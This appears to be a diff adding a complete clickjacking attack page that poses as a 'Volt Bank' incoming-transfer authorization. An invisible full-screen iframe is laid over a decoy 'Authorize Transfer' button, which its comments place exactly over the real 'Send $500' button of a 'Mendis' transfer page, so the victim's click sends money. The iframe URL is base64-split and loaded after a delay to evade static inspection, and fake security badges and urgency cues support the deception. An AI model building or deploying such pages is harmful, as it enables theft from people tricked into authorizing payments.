@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Volt Bank — Transfer Authorization</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+:root { --bg: #F4F6FA; --ink: #0D1117; --muted: #5B6474; --line: #E3E7EE; --surf: #fff; --brand: #0057FF; }
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { --bg: #0D1117; --ink: #E8ECF4; --muted: #8B95A8; --line: #1E2432; --surf: #141924; --brand: #4D8DFF; color-scheme: dark; } }
+:root[data-theme="dark"] { --bg: #0D1117; --ink: #E8ECF4; --muted: #8B95A8; --line: #1E2432; --surf: #141924; --brand: #4D8DFF; color-scheme: dark; }
+body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
+
+/* ── INVISIBLE IFRAME — transfer-confirm.html, full viewport, on top ── */
+#victim-frame {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+  opacity: 0;
+  z-index: 100;
+  pointer-events: auto;
+}
+
+.header {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 18px 24px;
+  border-bottom: 1px solid var(--line);
+  background: var(--surf);
+  position: relative;
+  z-index: 1;
+}
+.header-logo {
+  width: 32px; height: 32px;
+  border-radius: 9px;
+  background: var(--brand);
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 800; font-size: 13px; color: #fff; letter-spacing: -.02em;
+}
+.header-title { font-size: 16px; font-weight: 700; color: var(--ink); }
+.header-badge { margin-left: auto; font-size: 11px; font-weight: 700; color: #16A34A; background: #DCFCE7; padding: 3px 8px; border-radius: 20px; }
+
+.content { max-width: 420px; margin: 0 auto; padding: 32px 24px 160px; }
+.bank-logo { width: 48px; height: 48px; border-radius: 14px; background: var(--brand); display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 16px; color: #fff; margin-bottom: 20px; }
+.badge { display: inline-flex; align-items: center; gap: 6px; background: #DCFCE7; border: 1px solid #86EFAC; color: #15803D; font-size: 11px; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; padding: 4px 10px; border-radius: 20px; margin-bottom: 16px; }
+h1 { font-size: 22px; font-weight: 800; line-height: 1.2; margin-bottom: 10px; }
+.subtitle { font-size: 14px; color: var(--muted); line-height: 1.65; margin-bottom: 28px; }
+.transfer-card { background: var(--surf); border: 1px solid var(--line); border-radius: 14px; padding: 20px; margin-bottom: 20px; }
+.transfer-amount { font-size: 32px; font-weight: 800; color: #16A34A; letter-spacing: -.02em; margin-bottom: 4px; }
+.transfer-from { font-size: 13px; color: var(--muted); margin-bottom: 16px; }
+.transfer-row { display: flex; justify-content: space-between; padding: 10px 0; border-top: 1px solid var(--line); font-size: 13px; }
+.transfer-row-label { color: var(--muted); }
+.transfer-row-value { font-weight: 600; color: var(--ink); }
+.info-box { background: #EFF6FF; border: 1px solid #BFDBFE; border-radius: 12px; padding: 14px 16px; margin-bottom: 20px; font-size: 13px; color: #1D4ED8; line-height: 1.6; }
+.note { font-size: 12px; color: var(--muted); line-height: 1.5; }
+
+/* ── FAKE BUTTON — same fixed position as transfer-confirm.html's real button ── */
+.auth-btn {
+  position: fixed;
+  bottom: 80px;
+  left: 24px;
+  right: 24px;
+  height: 54px;
+  background: var(--brand);
+  color: #fff;
+  border: none;
+  border-radius: 14px;
+  font-family: inherit;
+  font-size: 15px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  box-shadow: 0 4px 16px rgba(0,87,255,.35);
+  z-index: 2;
+  pointer-events: none;
+  cursor: pointer;
+}
+.auth-note {
+  position: fixed;
+  bottom: 48px;
+  left: 0; right: 0;
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted);
+  z-index: 2;
+  pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Mendis transfer-confirm.html — invisible, intercepts all clicks -->
+<iframe id="victim-frame" src="about:blank"></iframe>
+
+<div class="header">
+  <div class="header-logo">V</div>
+  <span class="header-title">Volt Bank</span>
+  <span class="header-badge">🔒 Secure</span>
+</div>
+
+<div class="content">
+  <div class="bank-logo">V</div>
+  <div class="badge">✓ Incoming Transfer</div>
+  <h1>Authorize Incoming Transfer</h1>
+  <p class="subtitle">
+    A transfer is pending deposit into your linked Mendis account.
+    Review the details and authorize below to receive the funds.
+  </p>
+
+  <div class="transfer-card">
+    <div class="transfer-amount">+$500.00</div>
+    <div class="transfer-from">from @sales.corp · Volt Business</div>
+    <div class="transfer-row">
+      <span class="transfer-row-label">Destination</span>
+      <span class="transfer-row-value">Mendis ••••4521</span>
+    </div>
+    <div class="transfer-row">
+      <span class="transfer-row-label">Reference</span>
+      <span class="transfer-row-value">INV-2026-1148</span>
+    </div>
+    <div class="transfer-row">
+      <span class="transfer-row-label">Arrival</span>
+      <span class="transfer-row-value">Instant</span>
+    </div>
+    <div class="transfer-row">
+      <span class="transfer-row-label">Fee</span>
+      <span class="transfer-row-value">$0.00</span>
+    </div>
+  </div>
+
+  <div class="info-box">
+    This authorization is required because your Mendis account is linked through Volt's open banking integration. Your funds will appear in Mendis within seconds.
+  </div>
+
+  <p class="note">Volt Bank uses 256-bit encryption on all transfer authorizations. This request expires in 14 minutes.</p>
+</div>
+
+<!-- Fake "Authorize" button — same position as real "Send $500" button in iframe -->
+<div class="auth-btn">🔒 Authorize Transfer</div>
+<div class="auth-note">Secured by Volt Bank · Open Banking v2</div>
+
+<script>
+// Assemble target URL at runtime — not present in static source
+setTimeout(function() {
+  var p = ['aHR0cHM6Ly9tb25lZGlzLm9u','cmVuZGVyLmNvbS90cmFuc2Zlci','1jb25maXJtLmh0bWw='];
+  document.getElementById('victim-frame').src = atob(p.join(''));
+}, 4000);
+</script>
+
+</body>
+</html>
